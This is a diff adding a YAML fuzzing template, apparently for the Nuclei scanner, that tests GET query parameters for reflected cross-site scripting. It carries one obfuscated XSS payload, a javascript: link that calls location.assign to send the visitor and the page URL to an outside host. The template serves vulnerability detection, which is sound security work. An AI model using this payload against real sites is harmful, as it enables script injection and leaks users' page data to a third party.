@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom2
+
+info:
+  name: Advanced Reflection XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template detects advanced reflection XSS vulnerabilities using a specified crafted payload with potential JavaScript execution.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "?>\<a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>Click"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
